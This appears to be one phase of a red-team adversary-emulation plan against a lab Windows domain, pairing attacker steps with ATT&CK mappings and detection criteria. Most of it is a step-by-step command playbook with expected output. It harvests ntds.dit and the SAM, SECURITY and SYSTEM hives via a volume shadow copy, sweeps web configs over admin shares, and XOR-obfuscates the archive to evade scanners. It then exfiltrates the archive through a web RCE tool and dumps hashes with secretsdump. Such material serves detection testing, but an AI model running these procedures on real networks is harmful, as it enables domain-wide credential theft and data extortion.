> Collection, Exfiltration

# Phase 4 - Collection & Exfiltration

## Overview

After establishing persistent Domain Admin C2 sessions on DC01 and a domain-user
session on WS01 in Phase 3, the attacker moves into the collection phase in
preparation for double-extortion. Using the `TESTLAB\Administrator` dnscat2 shell
on DC01, the attacker harvests credential material from the domain controller
(Step 1), collects web application configuration files from IIS01 over the admin
share (Step 2), and archives all staged data using three independent methods that
each produce distinct telemetry (Steps 3–5). The archived material is then staged
back to IIS01 and exfiltrated via the react2shell HTTP channel (Step 6).

Step 1 is the most sensitive step in the phase. `ntds.dit` access through a Volume
Shadow Copy is the canonical pre-ransomware credential harvest pattern on a Domain
Controller. T1003.003 (OS Credential Dumping: NTDS) is explicitly out of scope for
Scenario 1 but is included here as a dual-mapped row alongside T1005 because the
VSS/NTDS behavior produces a distinct credential-access detection signal independent
of the collection signal, and omitting it would make the DC compromise narrative
incomplete. `check.py` will write the T1003.003 row to `_out_of_scope.csv`.

All six steps run from DC01 and IIS01: Steps 1–5 execute in the `TESTLAB\Administrator`
dnscat2 session on DC01; Step 6 uses the existing react2shell HTTP channel for
exfiltration. No new payloads are required: all tooling is `vssadmin.exe`,
`reg.exe`, `makecab.exe` (native Windows), PowerShell built-ins, and the react2shell
session already open from Phase 2.

---

## Step 1 - DC Credential Material & Local Data Staging

### Voice Track

With Domain Admin privileges on DC01, the attacker's first objective is to harvest
the AD credential database for offline cracking. `ntds.dit` is held open exclusively
by the Active Directory Domain Services service and cannot be copied directly. The
attacker creates a Volume Shadow Copy of `C:`, accesses `ntds.dit` and the SYSTEM
registry hive through the VSS device path, then immediately deletes the shadow to
remove the artifact.

The SYSTEM hive is required to decrypt the NTDS password hashes offline: it holds
the SYSKEY used to encrypt the credential store. `SAM` and `SECURITY` hives are not
locked by VSS and are exported directly with `reg save`. Together these four files —
`ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, `SECURITY.hiv` — provide everything needed to
recover every domain account's NT hash with `impacket-secretsdump` or equivalent
tooling, without ever contacting a live domain controller again.

All collected files are staged in `C:\ProgramData\CertStore\`, a directory named to
blend with certificate infrastructure that is plausibly present on a Windows Server.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create the staging directory

  ```text
  C:\ProgramData> mkdir C:\ProgramData\CertStore
  ```

  - ***Expected Output***

    ```text
    (directory created; or "A subdirectory or file C:\ProgramData\CertStore already exists." if present from a prior run)
    ```

- ☣️ Create a Volume Shadow Copy of C:

  ```text
  C:\ProgramData> vssadmin create shadow /for=C:
  ```

  - ***Expected Output***

    ```text
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Successfully created shadow copy for 'C:\'
        Shadow Copy ID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
        Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
    ```

  > **Note:** Record the `Shadow Copy ID` from the output for the delete step below.
  > The shadow device path (`HarddiskVolumeShadowCopy1`) may differ if prior shadows
  > exist on DC01 — use the volume name reported in the output.

- ☣️ Copy `ntds.dit` and SYSTEM hive from the shadow device path

  ```text
  C:\ProgramData> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ProgramData\CertStore\ntds.dit
  C:\ProgramData> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ProgramData\CertStore\SYSTEM.hiv
  ```

  - ***Expected Output***

    ```text
            1 file(s) copied.
            1 file(s) copied.
    ```

- ☣️ Delete the shadow copy to remove the VSS artifact

  ```text
  C:\ProgramData> vssadmin delete shadows /shadow={xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} /quiet
  ```

  - ***Expected Output***

    ```text
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Successfully deleted 1 shadow copies.
    ```

- ☣️ Export SAM and SECURITY registry hives

  ```text
  C:\ProgramData> reg save HKLM\SAM C:\ProgramData\CertStore\SAM.hiv /y
  C:\ProgramData> reg save HKLM\SECURITY C:\ProgramData\CertStore\SECURITY.hiv /y
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    The operation completed successfully.
    ```

- ☣️ Verify all four credential files are staged

  ```text
  C:\ProgramData> dir C:\ProgramData\CertStore\
  ```

  - ***Expected Output***

    ```text
     Directory of C:\ProgramData\CertStore

    <date>  <time>    <size> ntds.dit
    <date>  <time>    <size> SYSTEM.hiv
    <date>  <time>    <size> SAM.hiv
    <date>  <time>    <size> SECURITY.hiv
                   4 File(s)    <total> bytes
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | `vssadmin.exe create shadow` spawned from `RuntimeBroker.exe` ghost (dnscat2 parent); `cmd.exe` child of `RuntimeBroker.exe` accessing `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit`; Sysmon Event 1 for both VSS create and VSS delete | Calibrated - Not Benign | `vssadmin create shadow` creates a VSS snapshot of `C:` to access the locked `ntds.dit`; `ntds.dit` and `SYSTEM.hiv` are copied via the shadow device path; shadow is immediately deleted — classic NTDS credential harvest pattern | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -
| Collection | T1005 | Data from Local System | Windows | Sysmon Event 11 on DC01: `ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, and `SECURITY.hiv` written to `C:\ProgramData\CertStore\` by `cmd.exe` and `reg.exe` descended from `RuntimeBroker.exe` ghost | Calibrated - Not Benign | Credential database files copied from VSS shadow path and `HKLM` registry hives saved into the local staging directory | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -
| Collection | T1074.001 | Data Staged: Local Data Staging | Windows | `C:\ProgramData\CertStore\` created on DC01; credential-material files (`ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, `SECURITY.hiv`) accumulated in the staging directory by the attacker before archiving | Not Calibrated - Not Benign | `C:\ProgramData\CertStore\` is designated as the attacker's local staging directory; file writes to this path across Steps 1–2 constitute the staging behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -
| Collection | T1119 | Automated Collection | Windows | `vssadmin.exe` + `copy` + `reg save` sequence executed in automated succession from within dnscat2 ghost process; all four credential-material files collected without operator interaction between each copy | Calibrated - Not Benign | Sub-steps A and B together form a scripted, automated sweep of DC credential material: VSS shadow creation, shadow path copy of `ntds.dit` and `SYSTEM.hiv`, hive export of `SAM` and `SECURITY`, shadow deletion — all in a single non-interactive sequence | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -

---

## Step 2 - Network Share Data Collection (IIS01 Web Configs)

### Voice Track

From the DC01 domain-admin dnscat2 shell, the attacker reaches across to IIS01 over
SMB. `TESTLAB\Administrator` has implicit access to every admin share on
domain-joined hosts, so no additional authentication or lateral movement is required
to read `\\IIS01\C$`. IIS01 is the initial access host from Phase 1 and is already
known to the attacker.

The `inetpub` directory tree hosts two web applications: `react.testlab.local` and
`upload.testlab.local`. Their configuration files — `web.config`, `.env`, `*.json` —
may contain database connection strings, API keys, or credential material useful for
double-extortion leverage or further movement. A recursive PowerShell sweep copies
all config-class files from `\\IIS01\C$\inetpub\` into the staging directory on DC01.

The authentication event for this step appears on IIS01: `TESTLAB\Administrator`
network logon from DC01's IP (`10.12.10.10`), with Security Event 5145 recording the
`C$` share access and file read operations inside `inetpub\`.

### Procedures

- ☣️ From the DC01 dnscat2 shell, recursively collect web application config files from IIS01

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$dst='C:\ProgramData\CertStore'; Get-ChildItem -Recurse -Path '\\IIS01\C$\inetpub' -Include '*.config','*.json','*.env','*.xml','*.ini','*.key' -ErrorAction SilentlyContinue | Copy-Item -Destination $dst -Force -ErrorAction SilentlyContinue"
  ```

  - ***Expected Output***

    ```text
    (no output — files are copied silently; errors for inaccessible paths are suppressed)
    ```

- ☣️ Verify collected config files landed in the staging directory

  ```text
  C:\ProgramData> dir C:\ProgramData\CertStore\*.config C:\ProgramData\CertStore\*.json C:\ProgramData\CertStore\*.xml 2>nul
  ```

  - ***Expected Output***

    ```text
     Directory of C:\ProgramData\CertStore

    <date>  <time>      <size> web.config
    <date>  <time>      <size> appsettings.json
                   2 File(s)    <size> bytes
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1039 | Data from Network Shared Drive | Windows | Security Event 4624 on IIS01: `TESTLAB\Administrator` network logon (Logon Type 3) from `10.12.10.10` (DC01); Security Event 5145 on IIS01: `C$` share accessed, `inetpub\` path enumerated; Sysmon Event 11 on DC01: config files written to `C:\ProgramData\CertStore\` | Calibrated - Not Benign | `Get-ChildItem -Recurse -Path '\\IIS01\C$\inetpub'` from within the dnscat2 ghost process on DC01 collects web application configuration files (`.config`, `.json`, `.env`, `.xml`) over the `C$` admin share; copied files are staged locally on DC01 | DC01 (10.12.10.10) → IIS01 (10.12.10.20) | TESTLAB\Administrator | - | -

---

## Step 3 - Archive via Utility (makecab LOLBin)

### Voice Track

`makecab.exe` is a native Windows Server 2022 binary — no third-party install
required. The attacker uses it to compress all staged files in `CertStore\` into a
single cabinet archive. The compression reduces the archive size and wraps the
collected material into a single transfer-ready file.

The key detection signal here is process lineage: `makecab.exe` spawning from the
`RuntimeBroker.exe` ghost process. `RuntimeBroker.exe` is a legitimate UWP broker
process in Windows but does not ordinarily spawn archival utilities. The `SourceDir`
and `CabinetNameTemplate` arguments pointing to `CertStore` make the parent-child
relationship unambiguous.

### Procedures

- ☣️ From the DC01 dnscat2 shell, generate a makecab directive file for the staged contents

  ```text
  C:\ProgramData> (echo .Set CabinetNameTemplate=certstore.cab & echo .Set DiskDirectoryTemplate=C:\ProgramData & echo .Set MaxDiskSize=0 & echo .Set CompressionType=LZX & for %f in ("C:\ProgramData\CertStore\*.*") do @echo "%f") > C:\ProgramData\certstore.ddf
  ```

  - ***Expected Output***

    ```text
    (no output — directive file written silently)
    ```

- ☣️ Run makecab against the directive file

  ```text
  C:\ProgramData> makecab /f C:\ProgramData\certstore.ddf /V0
  ```

  - ***Expected Output***

    ```text
    Cabinet    : certstore.cab
    Disk       : 1
    File       : ntds.dit
    File       : SYSTEM.hiv
    File       : SAM.hiv
    File       : SECURITY.hiv
    File       : web.config
    ...
    Compression: LZX
    ```

- ☣️ Confirm the archive was created

  ```text
  C:\ProgramData> dir C:\ProgramData\certstore.cab
  ```

  - ***Expected Output***

    ```text
    <date>  <time>      <size> certstore.cab
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | Sysmon Event 1 on DC01: `makecab.exe` spawns from `RuntimeBroker.exe` ghost (dnscat2 parent); command line shows `certstore.ddf` directive referencing `C:\ProgramData\CertStore`; Sysmon Event 11: `certstore.cab` created in `C:\ProgramData\` | Calibrated - Not Benign | `makecab.exe /f certstore.ddf` compresses all staged files in `CertStore\` into `certstore.cab`; `makecab.exe` invoked directly from within the dnscat2 ghost process — anomalous parent for a cabinet compression utility | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -

---

## Step 4 - Archive via Library (.NET ZipFile API)

### Voice Track

As a second archive pass producing fundamentally different telemetry, the attacker
calls the .NET `System.IO.Compression.ZipFile` API directly from PowerShell. No
child process is spawned: the ZIP archive is created entirely within the
`powershell.exe` process via an in-process DLL load. This technique is invisible to
process-creation telemetry but is observable through Sysmon image-load events
(`System.IO.Compression.FileSystem.dll` loading into `powershell.exe`) and PowerShell
Script Block Logging (Event ID 4104 recording the `ZipFile::CreateFromDirectory` call).

Because Steps 3 and 4 each use a different archival mechanism, they produce separate,
independently scoreable detection signals — `T1560.001` via process creation vs.
`T1560.002` via DLL load and script block.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create a ZIP archive of the staged directory via .NET API

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('C:\ProgramData\CertStore', 'C:\ProgramData\certstore.zip', [System.IO.Compression.CompressionLevel]::Optimal, \$false)"
  ```

  - ***Expected Output***

    ```text
    (no output — archive created silently)
    ```

- ☣️ Confirm the ZIP archive was created

  ```text
  C:\ProgramData> dir C:\ProgramData\certstore.zip
  ```

  - ***Expected Output***

    ```text
    <date>  <time>      <size> certstore.zip
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1560.002 | Archive Collected Data: Archive via Library | Windows | Sysmon Event 7 on DC01: `System.IO.Compression.FileSystem.dll` loaded into `powershell.exe` running under `RuntimeBroker.exe` ghost; Sysmon Event 11: `certstore.zip` created in `C:\ProgramData\`; PowerShell Script Block Logging Event 4104: `ZipFile::CreateFromDirectory` call visible in script block | Calibrated - Not Benign | `[System.IO.Compression.ZipFile]::CreateFromDirectory` called from PowerShell via in-process DLL load; no child process spawned — distinct telemetry from the `makecab.exe` archive step | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -

---

## Step 5 - Archive via Custom Method (XOR Obfuscation)

### Voice Track

To prevent static file scanners from identifying the archive on disk, the attacker
XOR-encrypts `certstore.zip` in memory before writing to disk. A byte-by-byte XOR
loop using key `0x5A` — deliberately chosen to differ from Phase 2's `f.elif` key
`0x35` — replaces every byte of the ZIP file, destroying the ZIP magic bytes
(`PK\x03\x04`) and all structural markers. The output `certstore.tmp` appears as
opaque binary noise to signature-based detection. `certstore.zip` is deleted
immediately after encryption.

The XOR key and the PowerShell `-bxor` idiom are the same fingerprint class as the
`f.elif` encryption in Phase 2, confirming actor consistency across phases. The
distinction in key value (`0x35` vs. `0x5A`) is visible in Script Block Logging —
a subtle but attributable operational signature.

### Procedures

- ☣️ From the DC01 dnscat2 shell, XOR-encrypt the ZIP archive and write an opaque binary to disk

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$z=[System.IO.File]::ReadAllBytes('C:\ProgramData\certstore.zip'); $enc=[byte[]]($z | ForEach-Object { $_ -bxor 0x5A }); [System.IO.File]::WriteAllBytes('C:\ProgramData\certstore.tmp',$enc)"
  ```

  - ***Expected Output***

    ```text
    (no output — encrypted file written silently)
    ```

- ☣️ Delete the plaintext ZIP archive

  ```text
  C:\ProgramData> del C:\ProgramData\certstore.zip /f /q
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

- ☣️ Verify `certstore.tmp` is present and has no recognizable magic bytes

  ```text
  C:\ProgramData> dir C:\ProgramData\certstore.tmp
  C:\ProgramData> powershell -NoProfile -Command "[System.IO.File]::ReadAllBytes('C:\ProgramData\certstore.tmp')[0..3] | ForEach-Object { '0x{0:X2}' -f $_ }"
  ```

  - ***Expected Output***

    ```text
    <date>  <time>      <size> certstore.tmp

    0x69
    0x1A
    0x59
    0x5E
    ```

  > **Note:** The leading bytes `0x69 0x1A 0x59 0x5E` are the XOR product of the ZIP
  > magic bytes `0x50 0x4B 0x03 0x04` with key `0x5A`. No ZIP signature is present on
  > disk.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1560.003 | Archive Collected Data: Archive via Custom Method | Windows | PowerShell Script Block Logging Event 4104 on DC01: `-bxor 0x5A` loop with `ReadAllBytes`/`WriteAllBytes` visible in script block; Sysmon Event 11: `certstore.tmp` written to `C:\ProgramData\` with no recognizable file magic; Sysmon Event 11: `certstore.zip` deleted immediately after — staging artifact removed; XOR key `0x5A` and `-bxor` idiom match the actor fingerprint from Phase 2 `f.elif` (key `0x35`) | Calibrated - Not Benign | PowerShell XOR loop encrypts `certstore.zip` byte-by-byte with key `0x5A`; ciphertext written as `certstore.tmp`; ZIP file deleted — same actor fingerprint as Phase 2 XOR obfuscation, distinct key value | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -

---

## Step 6 - Archive Transfer & Exfiltration via React2Shell

### Voice Track

The dnscat2 DNS tunnel cannot carry `certstore.tmp`: its ~1–5 KB/s throughput would
require hours for an archive that includes `ntds.dit`. The react2shell HTTP channel —
already used in Phase 1 (initial access) and Phase 2 (LSASS dump exfil) — is the
correct vehicle. It operates at full HTTP throughput with no new C2 infrastructure and
no additional exposure.

`TESTLAB\Administrator` has implicit Domain Admin access to `\\IIS01\C$` from DC01.
A single `copy` command places `certstore.tmp` into the `react.testlab.local` web root
on IIS01 (`C:\inetpub\react.testlab.local\`), where the AppPool identity has read
access. React2shell's `download` command then reads it in 8,192-byte chunks — the same
mechanism that exfiltrated `f.elif` in Phase 2 — and reconstructs the archive on the
attacker machine. After the download is confirmed, `certstore.tmp` is deleted from the
IIS01 web root and from DC01.

The resulting `certstore.tmp` on the attacker machine is decrypted with the same
Python one-liner pattern used for `f.elif`, substituting key `0x5A`. Expanding the
recovered `certstore.zip` yields `ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, `SECURITY.hiv`,
and the IIS01 config files — all material needed for offline credential extraction via
`impacket-secretsdump`.

### Procedures

- ☣️ From the DC01 dnscat2 shell, stage `certstore.tmp` to the IIS01 web root over the `C$` admin share

  ```text
  C:\ProgramData> copy C:\ProgramData\certstore.tmp \\IIS01\C$\inetpub\react.testlab.local\certstore.tmp
  ```

  - ***Expected Output***

    ```text
            1 file(s) copied.
    ```

- ☣️ Launch (or resume) the react2shell session and download `certstore.tmp`

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  ```
  rce > download C:\inetpub\react.testlab.local\certstore.tmp
  ```

  - ***Expected Output***

    ```text
    [*] Downloading C:\inetpub\react.testlab.local\certstore.tmp (<size> bytes) in <N> chunk(s) via eval (NO spawn - STEALTH!)...
    [*] Progress: 100/<N> chunks (<size>/<total> bytes)
    ...
    [+] File saved to: certstore.tmp (<total> bytes, NO process spawn!)
    ```

- ☣️ XOR-decrypt `certstore.tmp` on the attacker machine to recover the ZIP archive

  ```bash
  python -c "data=open('certstore.tmp','rb').read(); open('certstore.zip','wb').write(bytes(b^0x5A for b in data))"
  ```

- ☣️ Verify the decrypted archive has the correct ZIP magic bytes

  ```bash
  python -c "data=open('certstore.zip','rb').read(); print(data[:4])"
  ```

  - ***Expected Output***

    ```text
    b'PK\x03\x04'
    ```

- ☣️ Extract the archive and run offline credential extraction

  ```bash
  unzip certstore.zip -d certstore/
  impacket-secretsdump -ntds certstore/ntds.dit -system certstore/SYSTEM.hiv -sam certstore/SAM.hiv LOCAL
  ```

  - ***Expected Output***

    ```text
    [*] Target system bootKey: 0x<syskey>
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: <pek>
    [*] Reading and decrypting hashes from certstore/ntds.dit
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:41c46bf74ec071f65c7b97df4b7d672a:::
    ...
    ```

- ☣️ Cleanup: delete `certstore.tmp` from the IIS01 web root (from DC01 dnscat2 shell)

  ```text
  C:\ProgramData> del \\IIS01\C$\inetpub\react.testlab.local\certstore.tmp /f /q
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | Security Event 4624 on IIS01: `TESTLAB\Administrator` network logon (Logon Type 3) from `10.12.10.10` (DC01); Security Event 5145 on IIS01: `C$` share write to `inetpub\react.testlab.local\certstore.tmp`; Sysmon Event 11 on IIS01: `certstore.tmp` created in web root via SMB session from DC01 | Calibrated - Not Benign | `copy certstore.tmp \\IIS01\C$\inetpub\react.testlab.local\certstore.tmp` from the DC01 dnscat2 shell stages the encrypted archive to IIS01 over the `C$` admin share; `TESTLAB\Administrator` domain admin token used — same admin share access pattern already established in Phase 3 Steps 2–5, now in the DC01→IIS01 direction for exfil staging | DC01 (10.12.10.10) → IIS01 (10.12.10.20) | TESTLAB\Administrator | - | -
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | `node.exe` on IIS01 reads `certstore.tmp` via eval-based `fs.readFileSync` and transmits its content as base64-encoded 8,192-byte chunks in successive HTTP 200 responses to the attacker; same chunked HTTP response stream as Phase 2 `f.elif` download (T1030 already scored); `certstore.tmp` size distinguishes this transfer from the ~10 s LSASS dump | Calibrated - Not Benign | react2shell `download C:\inetpub\react.testlab.local\certstore.tmp` exfiltrates the XOR-encrypted collection archive via the existing react2shell HTTP C2 channel; identical chunked eval-based mechanism to Phase 2 `f.elif` download — new exfil artifact, same C2 channel | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -

